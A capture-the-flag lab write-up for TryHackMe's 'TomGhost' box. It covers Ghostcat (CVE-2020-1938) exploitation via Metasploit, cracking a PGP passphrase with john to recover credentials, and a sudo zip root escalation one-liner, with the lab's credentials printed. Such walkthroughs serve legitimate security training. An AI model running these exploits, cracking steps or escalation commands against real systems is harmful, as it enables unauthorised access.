# TomGhost

This lab's focus is to train my Privilege Escalation skills in Linux. Let's start!

### Nmap Enumeration

```
nmap -A -p- <ip>
```

> PORT     STATE SERVICE    VERSION
> 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
> |   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
> |_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
> 53/tcp   open  tcpwrapped
> 8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
> | ajp-methods: 
> |_  Supported methods: GET HEAD POST OPTIONS
> 8080/tcp open  http       Apache Tomcat 9.0.30
> |_http-title: Apache Tomcat/9.0.30
> |_http-favicon: Apache Tomcat

From the output above we have several open ports:

- SSH 22
- DNS 53
-  AJP (Apache JServ Protocol) 8009
- HTTP 8080

### AJPP 8009

A google search for AJP and Hacktricks points to CVE-2020-1938 Ghostcat:

![image-20230806125210502](./images/image-20230806125210502.png)

We can download the script or use Metasploit to check if the target is vulnerable to this LFI which discloses the contents of WEB-INF/web.xml.

![image-20230806124913070](./images/image-20230806124913070.png)

We can use /auxiliary/admin/http/tomcat_ghostcat to exploit the vulnerable target and recover a set of credentials `skyfuck:8730281lkjlkjdqlksalks`.

### Privilege Escalation (Merlin)

The user.txt flag can be recovered under /home/merlin/user.txt:

```
find / -name user.txt 2> /dev/null
```

If we list our user's home directory we can see that there are two files there:

- tryhackme.asc - An ASC file is a variant of the ASCII format, which is an encryption file used by Pretty Good Privacy (PGP) for secure online communication. It includes messages and digital signatures, as well as plain text and binary information.
- credential.gpg  - A GPG file is an encryption/decryption key file that is used by GNU Privacy Guard (GnuPG) encryption program.

Having access to the gpg private key and the encrypted file we can decrypt it:

```
gpg --import tryhackme.asc
gpg --decrypt credential.gpg
```

Unfortunately we do not have the pass-phrase to complete the decryption process. Let's crack it using `gpg2john` and `john`.

```
scp skyfuck@<ip>:tryhackme.asc .
gpg2john tryhackme.asc  > gpghashtest
john gpghashtest
```

![image-20230806165119869](./images/image-20230806165119869.png)

Great! Knowing the pass-phrase we can decrypt **credential.gpg**.

![image-20230806170150346](./images/image-20230806170150346.png)

We got merlin's credentials.

`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

### Privilege Escalation (Root)

Change user:

```
su merlin
```

Check if there are any commands we can run with sudo:

```
sudo -l
```

We can run `zip` with sudo without providing root's password. According to GTFOBins escalation to root can be performed using:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

![image-20230806170624719](./images/image-20230806170624719.png)

As you can see we are root!
